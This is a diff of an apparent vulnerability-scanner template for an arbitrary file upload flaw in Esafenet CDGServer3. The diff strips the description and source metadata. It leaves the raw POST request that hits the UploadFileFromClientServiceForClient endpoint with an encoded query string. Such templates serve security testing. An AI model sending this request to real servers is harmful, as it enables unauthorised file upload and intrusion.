@@ -3,17 +3,11 @@ info:
   name: 亿赛通UploadFileFromClientServiceForClient接口任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tp4i9a4omznemnme'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tp4i9a4omznemnme
-    fofa: 暂无
 http:
 - raw:
   - 'POST /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBLAOLBAKBNDHLIGBKEOJLICAIDMGEDJKGP HTTP/1.1
-
-
 
 
     dudesuite
